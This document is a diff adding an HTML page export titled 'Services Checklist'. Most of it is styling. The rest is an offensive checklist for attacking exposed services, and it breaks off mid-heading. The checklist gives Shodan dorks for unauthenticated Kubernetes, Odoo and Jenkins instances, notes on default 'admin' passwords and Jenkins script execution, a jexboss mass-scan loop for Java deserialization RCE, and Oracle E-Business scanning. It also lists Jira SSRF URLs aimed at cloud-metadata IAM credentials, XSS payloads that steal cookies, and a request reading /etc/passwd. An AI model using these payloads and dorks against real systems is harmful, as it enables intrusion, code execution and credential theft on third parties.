@@ -1,1 +1,842 @@
-test
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Services Checklist</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+/* Override strong tags inside headings to maintain consistent weight */
+h1 strong,
+h2 strong,
+h3 strong {
+	font-weight: 600;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 10px;
+	padding: 1rem;
+	/* Paint a complete callout box on every PDF page fragment. */
+	-webkit-box-decoration-break: clone;
+	box-decoration-break: clone;
+}
+
+/* For default-background callouts, render the border outline. */
+.callout.block-color-default_background {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+/*
+ * Toggles and callouts hold arbitrary content, so they can easily be taller
+ * than a page. They must stay breakable: avoiding breaks inside them makes
+ * Chromium push the whole block onto the next page, which leaves the previous
+ * page mostly empty before every long toggle.
+ */
+details,
+aside {
+	margin: 1.25em 0;
+}
+
+/* Keep a toggle's title on the same page as the start of its content. */
+summary {
+	page-break-after: avoid;
+	break-after: avoid;
+}
+
+/*
+ * Toggle headings render as <h1/h2/h3 style="display:inline-block"> inside
+ * <summary>. Without this reset, the heading's margin-top pushes it below the
+ * ::marker (▼), so the triangle and the title appear on separate lines.
+ */
+summary h1,
+summary h2,
+summary h3,
+summary h4 {
+	margin-top: 0;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+
+	table.collection-content {
+		width: 100%;
+		table-layout: fixed;
+	}
+
+	table.collection-content th,
+	table.collection-content td {
+		overflow-wrap: anywhere;
+	}
+
+	table.collection-content td > .user,
+	table.collection-content td > time {
+		white-space: pre-wrap;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content-wrapper {
+	overflow-x: auto;
+}
+
+@media only print {
+	.collection-content-wrapper {
+		overflow-x: visible;
+	}
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.collection-content td {
+	white-space: pre-wrap;
+	word-break: break-word;
+}
+
+.column-list {
+	display: flex;
+	gap: 46px;
+}
+
+.column {
+	min-width: 0;
+	overflow: hidden;
+}
+
+.column > *:first-child {
+	margin-top: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding-inline: 0.125rem;
+	padding-block: 0.375rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+table {
+	border-collapse: collapse;
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol.numbered-list.numbered-list-digits-2 {
+	padding-inline-start: 2em;
+}
+
+ol.numbered-list.numbered-list-digits-3plus {
+	padding-inline-start: 2.4em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+	margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-flex;
+	align-items: center;
+	justify-content: center;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+/*
+ * Render emoji icons using a ::before pseudo-element to keep the glyph
+ * out of the DOM textContent traversal. This avoids double-rendering icons
+ * in callouts and page titles.
+ * NOTE(slim/html-export-pseudo-icons): I can't tagref this because it will
+ * flag as a duplicate tag after codegen.
+ */
+.icon[data-emoji]::before {
+	content: attr(data-emoji);
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.callout img.notion-static-icon {
+	width: 1em;
+	height: 1em;
+}
+
+.callout p {
+	margin: 0;
+}
+
+.callout h1,
+.callout h2,
+.callout h3 {
+	margin: 0 0 0.6rem;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	margin-right: 0.4em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+blockquote.quote-large {
+	font-size: 1.25em;
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.tab {
+	margin: 1.25em 0;
+	padding-inline: 1rem;
+	border: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(44, 44, 43, 1);
+}
+.highlight-gray {
+	color: rgba(125, 122, 117, 1);
+	fill: rgba(125, 122, 117, 1);
+}
+.highlight-brown {
+	color: rgba(159, 118, 90, 1);
+	fill: rgba(159, 118, 90, 1);
+}
+.highlight-orange {
+	color: rgba(210, 123, 45, 1);
+	fill: rgba(210, 123, 45, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 148, 52, 1);
+	fill: rgba(203, 148, 52, 1);
+}
+.highlight-teal {
+	color: rgba(80, 148, 110, 1);
+	fill: rgba(80, 148, 110, 1);
+}
+.highlight-blue {
+	color: rgba(56, 125, 201, 1);
+	fill: rgba(56, 125, 201, 1);
+}
+.highlight-purple {
+	color: rgba(154, 107, 180, 1);
+	fill: rgba(154, 107, 180, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(207, 81, 72, 1);
+	fill: rgba(207, 81, 72, 1);
+}
+.highlight-default_background {
+	color: rgba(44, 44, 43, 1);
+}
+.highlight-gray_background {
+	background: rgba(42, 28, 0, 0.07);
+}
+.highlight-brown_background {
+	background: rgba(139, 46, 0, 0.086);
+}
+.highlight-orange_background {
+	background: rgba(224, 101, 1, 0.129);
+}
+.highlight-yellow_background {
+	background: rgba(211, 168, 0, 0.137);
+}
+.highlight-teal_background {
+	background: rgba(0, 100, 45, 0.09);
+}
+.highlight-blue_background {
+	background: rgba(0, 124, 215, 0.094);
+}
+.highlight-purple_background {
+	background: rgba(102, 0, 178, 0.078);
+}
+.highlight-pink_background {
+	background: rgba(197, 0, 93, 0.086);
+}
+.highlight-red_background {
+	background: rgba(223, 22, 0, 0.094);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(125, 122, 117, 1);
+	fill: rgba(125, 122, 117, 1);
+}
+.block-color-brown {
+	color: rgba(159, 118, 90, 1);
+	fill: rgba(159, 118, 90, 1);
+}
+.block-color-orange {
+	color: rgba(210, 123, 45, 1);
+	fill: rgba(210, 123, 45, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 148, 52, 1);
+	fill: rgba(203, 148, 52, 1);
+}
+.block-color-teal {
+	color: rgba(80, 148, 110, 1);
+	fill: rgba(80, 148, 110, 1);
+}
+.block-color-blue {
+	color: rgba(56, 125, 201, 1);
+	fill: rgba(56, 125, 201, 1);
+}
+.block-color-purple {
+	color: rgba(154, 107, 180, 1);
+	fill: rgba(154, 107, 180, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(207, 81, 72, 1);
+	fill: rgba(207, 81, 72, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(240, 239, 237, 1);
+}
+.block-color-brown_background {
+	background: rgba(245, 237, 233, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 235, 222, 1);
+}
+.block-color-yellow_background {
+	background: rgba(249, 243, 220, 1);
+}
+.block-color-teal_background {
+	background: rgba(232, 241, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(229, 242, 252, 1);
+}
+.block-color-purple_background {
+	background: rgba(243, 235, 249, 1);
+}
+.block-color-pink_background {
+	background: rgba(250, 233, 241, 1);
+}
+.block-color-red_background {
+	background: rgba(252, 233, 231, 1);
+}
+.select-value-color-default { background-color: rgba(42, 28, 0, 0.07); }
+.select-value-color-gray { background-color: rgba(28, 19, 1, 0.11); }
+.select-value-color-brown { background-color: rgba(127, 51, 0, 0.156); }
+.select-value-color-orange { background-color: rgba(196, 88, 0, 0.203); }
+.select-value-color-yellow { background-color: rgba(209, 156, 0, 0.282); }
+.select-value-color-green { background-color: rgba(0, 96, 38, 0.156); }
+.select-value-color-blue { background-color: rgba(0, 118, 217, 0.203); }
+.select-value-color-purple { background-color: rgba(92, 0, 163, 0.141); }
+.select-value-color-pink { background-color: rgba(183, 0, 78, 0.152); }
+.select-value-color-red { background-color: rgba(206, 24, 0, 0.164); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style><style>@import url('https://cdn.jsdelivr.net/npm/katex@0.16.25/dist/katex-swap.min.css')</style></head><body><article id="8e45c53c-36a5-4cc1-bb72-00c4323efcdb" class="page sans"><header><h1 class="page-title" dir="auto">Services Checklist</h1><p class="page-description" dir="auto"></p></header><div class="page-body"><p id="d115815d-d800-45ce-86bd-5246a1e138aa" class="" dir="auto">
+</p><details id="0d38009c-95dd-49d3-bc4b-b6d05606a5b8" open="" class="toggle" dir="auto"><summary>Unauthenticated Instances issues</summary><div class="indented"><details id="90b4cdcd-b3a8-4f35-9993-e07699737559" open="" class="toggle" dir="auto"><summary><strong>Unauthenticated Kubernetes API</strong></summary><div class="indented"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6958a21f-d932-43aa-8c7c-b3fc7d5491fc" class="code code-wrap"><code style="white-space:pre-wrap;word-break:break-all">Kubernetes exposes an unauthenticated REST API on port 10250
+
+Once again we have 2 options, nMap for this port or shodan
+
+product:&quot;kubernetes&quot;
+port:&quot;10250&quot;
+
+Once a Kubernetes service is detected the first thing to do is to get a list of pods by sending a GET request to the /pods endpoint.
+
+
+apt-get install node-ws
+wscat -c “https://&lt;DOMAIN&gt;:&lt;PORT&gt;/&lt;Location Header Value&gt;” –no-check
+
+Its very easy to get RCE from this method :)</code></pre></div></details><details id="b85a2997-0149-473d-b909-8a062f0091db" open="" class="toggle" dir="auto"><summary><strong>Unauthenticated odoo Manager</strong></summary><div class="indented"><pre id="ce6bc1f0-79c3-4a17-ad84-9bd1809c05ed" class="code code-wrap"><code style="white-space:pre-wrap;word-break:break-all">Shodan Dork
+
+http.status:200 http.component:odoo port:8069
+
+After finding instances go to /web/database/manager most of the time there is either no password or it&#x27;s &quot;admin&quot;
+
+Or simply port scan for 8069</code></pre></div></details><details id="38253039-0567-4962-bdcb-6d1425402a6e" open="" class="toggle" dir="auto"><summary><strong>Unauthenticated Jenkins Instance</strong></summary><div class="indented"><pre id="8aa39bb9-9d00-40df-9d4f-4e3a6a166a16" class="code code-wrap"><code style="white-space:pre-wrap;word-break:break-all">Sometimes an application will be running Jenkins which allows Guest/Anonymous signups with /script enabled which allows code exec
+
+Also if you can install plugins there is a terminal plugin
+
+Try dirsearch for /script or use this script to find live Jenkins instances.
+
+Also worth checking Port 8080 alongside 443,80
+
+
+I recommened if you are working on a big program with thousands of domains to grep for jenkins and pipe all subdomains into full tcp ports scans. Sometimes the instance can be running on a weird port :)
+
+
+Also grep for these headers
+
+X-Hudson: 1.395
+X-Jenkins: 2.204.2
+X-Jenkins-Session: d615ef86
+X-You-Are-Authenticated-As: anonymous
+X-You-Are-In-Group-Disabled: JENKINS-39402:
+
+
+Shodan Dork to Find Open Jenkins Instances
+
+x-jenkins 200</code></pre></div></details></div></details><details id="5ca3d1b0-4261-49be-9575-4cb748be3e18" open="" class="toggle" dir="auto"><summary>Nginx Path Traversal</summary><div class="indented"><p id="b0a8a934-26e0-46d5-942f-33514a2fdf89" class="" dir="auto"><a href="https://twitter.com/403Timeout/status/1479445235424194560?s=20&amp;t=DTRsTBz4tWFuwxorT_khoQ">https://twitter.com/403Timeout/status/1479445235424194560?s=20&amp;t=DTRsTBz4tWFuwxorT_khoQ</a></p></div></details><details id="c453930c-f217-45dd-9aba-9096b367c873" open="" class="toggle" dir="auto"><summary>Drupal stuff</summary><div class="indented"><ol type="1" id="9cab75b7-7b4b-4e0f-b301-d554f2e5ce71" class="numbered-list" start="1" dir="auto"><li><a href="https://twitter.com/steiner254/status/1521133687240372224?s=20&amp;t=Dg3EzxfBEFlPeh5ba_-ZZQ">https://twitter.com/steiner254/status/1521133687240372224?s=20&amp;t=Dg3EzxfBEFlPeh5ba_-ZZQ</a></li></ol><ol type="1" id="be14460c-0ff7-45bb-9f77-8980d5286b75" class="numbered-list" start="2" dir="auto"><li><a href="https://twitter.com/Steiner254/status/1563961901284999179?s=20">https://twitter.com/Steiner254/status/1563961901284999179?s=20</a></li></ol><ol type="1" id="41cdc39c-2322-801c-85c5-e2c6f1169f9f" class="numbered-list" start="3" dir="auto"><li></li></ol></div></details><details id="695d830b-1121-4621-804f-1fa959dd097e" open="" class="toggle" dir="auto"><summary><strong><strong>Java Deserialization RCE</strong></strong></summary><div class="indented"><details id="f3531554-8cb6-4737-a825-9da09ec01008" open="" class="toggle" dir="auto"><summary><a href="https://github.com/joaomatosf/jexboss">https://github.com/joaomatosf/jexboss</a></summary><div class="indented"><p id="3948744a-bac0-44c9-8f1d-3324433fec27" class="" dir="auto">
+</p></div></details><p id="f7b12a8e-1fef-4d71-91aa-951180d71144" class="" dir="auto">$ for url in $(cat targets.txt); do python3 <a href="http://jexboss.py/">jexboss.py</a> -u $url; print $url; done</p></div></details><details id="d427a2f0-1648-4172-8c68-9f1cb70ed018" open="" class="toggle" dir="auto"><summary>Oracle E-Business Login mass scan —- </summary><div class="indented"><details id="1c32dbfe-e8f9-4a93-ab50-d9182e77bc65" open="" class="toggle" dir="auto"><summary><a href="https://github.com/momika233/Oracle-E-Business_Login">https://github.com/momika233/Oracle-E-Business_Login</a></summary><div class="indented"><p id="3ab2effa-2a2d-4ee9-bec4-566a06e9bf57" class="" dir="auto">Shodan:“X-ORACLE-DMS-ECID” http. title:”Login” 200</p></div></details><details id="b2b75bd4-f00f-4fba-bbec-16a5f8099d74" open="" class="toggle" dir="auto"><summary>Another way</summary><div class="indented"><p id="7a173a59-5d4e-4902-b46b-792efc7055db" class="" dir="auto">cat subdomains.txt | httpx -mc 200 -path &#x27;OA_HTML/ibeCAcpSSOReg.jsp&#x27; -ms &quot;&gt;Register as individual&lt;/a&gt;&quot; -t 200 - rl 100 -o oracle.txt</p></div></details></div></details><details id="8987b39c-0561-4b7d-ac45-8700e21cac17" open="" class="toggle" dir="auto"><summary>Jira vulnerabilities</summary><div class="indented"><details id="9fc55997-b5d1-461f-abbb-875c1256503a" open="" class="toggle" dir="auto"><summary>SSRF on Jira endpoint</summary><div class="indented"><ol type="1" id="da5331c8-523d-4c81-9c82-a0e70bdc42b3" class="numbered-list" start="1" dir="auto"><li>/<a href="http://plugins/servlet/oauth/users/icon-uri?consumerUri=%E2%80%A6http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/%E2%80%A6">plugins/servlet/oauth/users/icon-uri?consumerUri=http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/</a></li></ol><ol type="1" id="643a4bd2-e049-49a4-9531-7e5ab4860229" class="numbered-list" start="2" dir="auto"><li>/plugins/servlet/gadgets/makeRequest?url=http://host:port@bing.com</li></ol><ol type="1" id="2d22c056-2a5e-4334-b305-b03bb7ff84b5" class="numbered-list" start="3" dir="auto"><li></li></ol></div></details><details id="95441ec0-7136-4813-95b1-f4891de31bbf" open="" class="toggle" dir="auto"><summary>XSS on Jira endpoint</summary><div class="indented"><ol type="1" id="f2ae2535-9738-473d-9490-ea05b09f0bae" class="numbered-list" start="1" dir="auto"><li>/plugins/servlet/Wallboard/?dashboardId=10000&amp;dashboardId=10000&amp;cyclePeriod=alert(document.domain)</li></ol><ol type="1" id="9d812896-c62f-427c-b7ff-92a12eee250e" class="numbered-list" start="2" dir="auto"><li>secure/ConfigurePortalPages!default.jspa?view=search&amp;searchOwnerUserName=x2rnu%3Cscript%3Ealert(1)%3C%2fscript%3Et1nmk&amp;Search=Search</li></ol><ol type="1" id="8bb01af2-e178-443b-ac3d-964f8d370481" class="numbered-list" start="3" dir="auto"><li>pages/%3CIFRAME%20SRC%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E.vm</li></ol><ol type="1" id="3c2c3bee-7d7d-42f3-a5c3-c01a940b67f2" class="numbered-list" start="4" dir="auto"><li><a href="http://jira.test.com/plugins/servlet/Wallboard/?dashboardId=10000&amp;dashboardId=10000&amp;cyclePeriod=alert">http://jira.test.com/plugins/servlet/Wallboard/?dashboardId=10000&amp;dashboardId=10000&amp;cyclePeriod=alert</a>(document.cookie</li></ol></div></details><details id="0f98e7b7-5b4a-4d34-80f1-e02fb5a8a9f3" open="" class="toggle" dir="auto"><summary>RCE &amp; Path Traversal</summary><div class="indented"><p id="049aa2ff-5222-41f5-ba7d-6edf98aa4c4e" class="" dir="auto">POST /rest/tinymce/1/macro/preview HTTP/1.1<br/>Host: JIRA<br/>...</p><p id="f8f3b2e7-d3a7-4e7e-b385-afc1592d472a" class="" dir="auto">{&quot;contentId&quot;:&quot;1&quot;,&quot;macro&quot;:{&quot;name&quot;:&quot;widget&quot;,&quot;params&quot;:{&quot;url&quot;:&quot;<a href="https://www.viddler/">https://www.viddler</a>(.)com/v/23464dc5&quot;,&quot;width&quot;:&quot;1000&quot;,&quot;height&quot;:&quot;1000&quot;,&quot;_template&quot;:&quot;file:///etc/passwd&quot;},&quot;body&quot;:&quot;&quot;}}</p></div></details><details id="8ec458c6-ff73-4a13-9b4b-b55260b73522" open="" class="toggle" dir="auto"><summary>User info disclosure on Jira 